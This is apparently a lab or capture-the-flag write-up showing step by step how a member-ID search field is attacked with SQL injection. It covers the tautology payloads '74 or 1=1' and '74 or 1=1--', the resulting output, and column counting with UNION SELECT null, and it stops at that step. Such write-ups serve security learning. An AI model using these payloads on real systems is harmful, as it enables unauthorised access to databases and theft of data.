### **first-test**

try to write any basic SQL SELECT Statement in members input field as it is vulnerable to SQL injection

> You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'select \*' at line 1

we write to the search field `74 or 1=1` or `74 or 1=1--` replacing 74 by any random id as the input have a label:` SEARCH MEMBER BY ID`

> assumimg that the injected query `74 or 1=1-- ` is typically combined with the original query by the application's backend code before being sentto the database for execution. and the resulted query is something like : `SELECT <column_name1>, <column_name2> FROM <table_nams> WHERE ID = 74 or 1=1`

In this case, the injected part `74 OR 1=1--` causes the query to return all rows from the users table because 1=1 is always true. The -- at the end is used to comment out the rest of the original query to avoid syntax errors.(it's not necessary to use the hyphens).

> result
> ID: 74 or 1=1
> First name: one
> Surname : me

the result show that the oroginal select query over two columns and this is a very important information to use in the sql query injection.

The `UNION` operator is used to combine the result-set of two or more `SELECT` statements

- Every `SELECT` statement within `UNION` must have the same number of columns
- The columns must also have similar data types
- The columns in every `SELECT` statement must also be in the same order

> Syntaxe example :

SELECT _column_name(s)_ FROM _table1_ UNION SELECT _column_name(s)_ FROM _table2_;

### **Detecting number of columns**

To determine the number of columns in a query, select more and more null values until the query is correct:

> 74 or 1=1 UNION SELECT null // The used SELECT statements have a different number of columns
> 74 or 1=1 UNION SELECT null,null // worked
